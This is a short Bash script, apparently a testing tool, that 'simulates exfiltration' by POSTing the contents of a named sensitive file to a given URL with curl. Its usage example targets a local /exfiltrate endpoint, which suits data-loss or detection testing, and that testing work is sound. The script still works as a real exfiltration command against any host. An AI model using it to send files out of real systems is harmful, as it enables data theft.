#!/bin/bash

set -euo pipefail

usage() {
	echo "Usage: $0 <sensitive_file_path> <endpoint_url>"
	echo "Example: $0 ./sample_data.txt http://127.0.0.1:8080/exfiltrate"
}

if [[ ${1:-} == "-h" || ${1:-} == "--help" ]]; then
	usage
	exit 0
fi

if [[ $# -lt 2 ]]; then
	usage
	exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
	echo "Error: curl is not installed or not in PATH."
	exit 1
fi

SENSITIVE_FILE="$1"
ENDPOINT_URL="$2"

if [[ ! -f "$SENSITIVE_FILE" ]]; then
	echo "Error: file not found: $SENSITIVE_FILE"
	exit 1
fi

echo "[+] Simulating exfiltration to: $ENDPOINT_URL"
curl --fail --silent --show-error -X POST --data-binary "@$SENSITIVE_FILE" "$ENDPOINT_URL"
echo "[+] Exfiltration simulation request sent"
